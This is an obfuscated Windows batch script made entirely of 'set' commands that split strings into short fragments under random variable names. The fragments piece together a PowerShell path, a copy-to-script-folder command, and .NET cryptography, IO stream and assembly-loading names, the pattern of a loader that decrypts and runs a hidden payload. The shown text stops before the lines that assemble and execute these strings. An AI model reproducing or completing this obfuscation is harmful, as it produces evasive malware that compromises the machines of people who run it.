@echo off
set "lMdVntblqi=ll"
set "ipDlQUxxrC=s\"
set "YfpETyALQz=we"
set "PGqRtOdTIx=Wi"
set "PrHJpocAcR=po"
set "kJwAMslGsK=\W"
set "eUcwTwqdzg=Sy"
set "ZQdUbCzuhg=ll"
set "hrizAXIChM=in"
set "SYUogZweXR=\v"
set "AJTjCANWHi=ow"
set "QVigmQCXRh=rS"
set "IWqGMouNzN=co"
set "bhmzpglDUO=em"
set "lMjLKmBqxm=do"
set "oUIFQUSDyY=.e"
set "CdWfpbqgMm=1."
set "WsAaKcjWlS=xe"
set "LCiDnlRDbI= /"
set "wjoNzGHwqf=32"
set "mWOjRGAZeF=he"
set "wOPKIUHFpD=nd"
set "himeblwnPb=he"
set "RXCSOmAGnh=y "
set "yqPkHsKLNX=ws"
set "VElkHebOnC=Po"
set "BNpKqiOKUp= C"
set "cUydkrrJZc=rs"
set "YAHkodSnST=0\"
set "lfOiadvtAt=:\"
set "GBfImDJeEF=py"
set "kvbndhPXFm=we"
set "wPdXSfNgpS=st"
set "VyARkBkiXg= %~dp0"
set "UeODYvFLJn=cd"
set "nvjOMlUIdo=BUb "
set "hvnFYwKRyZ=grap"
set "UpChyeSxiq=ew-O"
set "eokSsQpTbL=..-1"
set "EQBPYNxBbE=V = "
set "rvhVJSveyZ=orF'"
set "itswOkENag=esFX"
set "UyoOqbopRO=m.IO"
set "iaGqJwmLEL= if "
set "xyUZfOvfyK=lRbo"
set "eaSqwsuOjZ=Stqk"
set "xkNjeSxbDE=hy.A"
set "LJbFCNunGM=iron"
set "XPssFmKJEl=.Len"
set "NemRhwYLyH=raph"
set "ICoiIvfFJk= New"
set "soyBuuicwj=pDZz"
set "IFevdhQiaB=.IO."
set "sMYrlfLlPL=esMa"
set "qKcaJuupEo=d) {"
set "rXFClaCUOM=nI ="
set "tnMrwlnFBT=$VDU"
set "RPVwRUAvUz=('%*'"
set "BFTDjmeGbJ=Stre"
set "lEkQIMQtSp=$rpF"
set "GajYwBABES=yqm."
set "IjGjxwEDUN=Z = "
set "bPgRTxqNJO=;$dy"
set "UUfOKlJLzG=ing("
set "vGveEzvuNu== $V"
set "DuWyhgPdnl=fore"
set "mDBnmnDZxJ=in $"
set "sGcFRnNvlC=.Ass"
set "ugxxUxDEIG=rt]:"
set "hBfKvXTrbh=UGTu"
set "guuZgPcqTQ=join"
set "zibOeKVHzh=Mode"
set "YevNuyHRvK=3HWs"
set "QgDwKGLVon=Vv.T"
set "Daoevfecdw=Secu"
set "MxuFncHVhl=ect "
set "pgDVbQSYeu=$lRb"
set "cODpGJjoGu=stem"
set "bxgdalhJVF=O.Me"
set "BJBMRBcLkG=tsWi"
set "gylaMuSJFq=.Cry"
set "oxvjWRvbyN=$qKr"
set "OPFEbsbUrc=saBm"
set "WoMRgRGcfV='dqR"
set "txvbiiXTTb=[IO."
set "lrxzwYyMAj=-4] "
set "vKEUMUUyDR=bstr"
set "kwPlDthevT=[-1."
set "UccFWHGNmk=OyzA"
set "TLGsFCKiuY=m.IO"
set "gBHmhRxpos=New-"
